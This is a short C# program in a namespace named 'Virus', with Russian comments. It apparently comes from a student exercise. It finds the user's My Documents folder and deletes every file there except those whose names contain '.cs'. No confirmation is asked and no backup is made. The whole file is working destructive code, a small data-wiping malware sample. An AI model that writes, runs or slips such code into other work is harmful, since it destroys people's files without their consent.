using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Virus
{
    class Program
    {
        static void Main(string[] args)
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments/*Programs  или Recent*/);// Перечисление адресов системных папок
            string[] files = Directory.GetFiles($@"{path}", "*.*"); // расширение того , что в папке. * все названия , которые нам нужны.  создаем массив с путями к файлам в указанной папкe
            for (int i = 0; i < files.Length; i++) // перебор файлов
            {
                if (Path.GetFileName(files[i]).Contains(".cs") != true)//нельзя удалять файлы с лабами по шарпу
                {
                    File.Delete(files[i]);
                   
                }
            }
         

        }
    }
}